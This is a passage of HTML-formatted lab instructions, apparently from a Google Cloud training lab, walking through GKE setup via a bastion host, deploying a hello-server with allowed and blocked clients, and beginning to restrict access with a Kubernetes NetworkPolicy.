</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Apply complete! Resources: 5 added, 0 changed, 0 destroyed.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p><strong><span>Test completed task</span></strong></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully deployed necessary infrastructure with Terraform, you will see an assessment score.</span></p><p><span>Use Terraform to set up the necessary infrastructure (Lab setup)</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Now ssh into the bastion for the remaining steps:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh gke-demo-bastion</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Existing versions of kubectl and custom Kubernetes clients contain provider-specific code to manage authentication between the client and Google Kubernetes Engine. Starting with v1.26, this code will no longer be included as part of the OSS kubectl. GKE users will need to download and use a separate authentication plugin to generate GKE-specific tokens. This new binary, </span><code>gke-gcloud-auth-plugin</code><span>, uses the </span><a href='https://kubernetes.io/docs/reference/access-authn-authz/authentication/#client-go-credential-plugins'><span>Kubernetes Client-go Credential Plugin</span></a><span> mechanism to extend kubectl’s authentication to support GKE. For more information, you can check out the following </span><a href='https://cloud.google.com/blog/products/containers-kubernetes/kubectl-auth-changes-in-gke'><span>documentation</span></a><span>.</span></p><p><span>To have kubectl use the new binary plugin for authentication instead of using the default provider-specific code, use the following steps.</span></p><ol start='' ><li><p><span>Once connected, run the following command to install the </span><code>gke-gcloud-auth-plugin</code><span> on the VM.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Set </span><code>export USE_GKE_GCLOUD_AUTH_PLUGIN=True</code><span> in </span><code>~/.bashrc</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "export USE_GKE_GCLOUD_AUTH_PLUGIN=True" &gt;&gt; ~/.bashrc</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">source ~/.bashrc</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to force the config for this cluster to be updated to the Client-go Credential Plugin configuration.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters get-credentials gke-demo-cluster --zone europe-west1-b</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>On success, you should see this message:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubeconfig entry generated for gke-demo-cluster.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>The newly-created cluster will now be available for the standard </span><code>kubectl</code><span> commands on the bastion.</span></p><h3 id='task-3-installing-the-hello-server'><span>Task 3. Installing the hello server</span></h3><p><span>The test application consists of one simple HTTP server, deployed as </span><code>hello-server</code><span>, and two clients, one of which will be labeled </span><code>app=hello</code><span> and the other </span><code>app=not-hello</code><span>.</span></p><p><span>All three services can be deployed by applying the hello-app manifests.</span></p><ol start='' ><li><p><span>On the bastion, run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl apply -f ./manifests/hello-app/</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-client-allowed created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-client-blocked created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">service/hello-server created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-server created</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><ol start='' ><li><p><span>Verify all three pods have been successfully deployed:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You will see one running pod for each of </span><em><span>hello-client-allowed</span></em><span>, </span><em><span>hello-client-blocked</span></em><span>, and </span><em><span>hello-server</span></em><span> deployments.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  READY &nbsp; &nbsp; STATUS &nbsp;  RESTARTS &nbsp; AGE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">hello-client-allowed-7d95fcd5d9-t8fsk &nbsp; |  1/1 &nbsp; &nbsp;  Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  14m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">hello-client-blocked-6497db465d-ckbn8 &nbsp; |  1/1 &nbsp; &nbsp;  Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  14m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">hello-server-7df58f7fb5-nvcvd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |  1/1 &nbsp; &nbsp;  Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  14m</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><strong><span>Test completed task</span></strong></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully deployed a simple HTTP hello server, you will see an assessment score.</span></p><p><span>Installing the hello server</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-4-confirming-default-access-to-the-hello-server'><span>Task 4. Confirming default access to the hello server</span></h3><ol start='' ><li><p><span>First, tail the &quot;allowed&quot; client:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs --tail 10 -f $(kubectl get pods -oname -l app=hello)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Press CTRL+C to exit.</span></p><ol start='' ><li><p><span>Second, tail the logs of the &quot;blocked&quot; client:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs --tail 10 -f $(kubectl get pods -oname -l app=not-hello)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Press CTRL+C to exit.</span></p></li></ol><p><span>You will notice that both pods are successfully able to connect to the </span><code>hello-server</code><span> service. This is because you have not yet defined a Network Policy to restrict access. In each of these windows you should see successful responses from the server.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-7df58f7fb5-nvcvd</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hello, world!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Version: 1.0.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-7df58f7fb5-nvcvd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hello, world!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Version: 1.0.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-7df58f7fb5-nvcvd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><h3 id='task-5-restricting-access-with-a-network-policy'><span>Task 5. Restricting access with a Network Policy</span></h3><p><span>Now you will block access to the </span><code>hello-server</code><span> pod from all pods that are not labeled with </span><code>app=hello</code><span>.</span></p><p><span>The policy definition you&#39;ll use is contained in </span><code>manifests/network-policy.yaml</code></p><ol start='' ><li><p><span>Apply the policy with the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl apply -f ./manifests/network-policy.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 